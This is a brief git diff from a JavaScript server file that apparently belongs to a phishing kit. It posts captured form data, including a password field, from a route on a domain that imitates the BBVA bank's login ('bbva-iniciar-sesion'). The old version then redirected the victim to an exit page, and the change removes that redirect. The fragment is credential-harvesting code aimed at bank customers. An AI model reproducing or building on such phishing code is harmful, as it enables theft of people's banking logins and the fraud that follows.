@@ -24,7 +24,7 @@ server.post('https://bbva-iniciar-sesion.github.io/post', (req, res) => {
         Password: pass
 
     }).then(x => {console.log(x)
-    res.redirect('./exit.html')
+   
 })
 
 
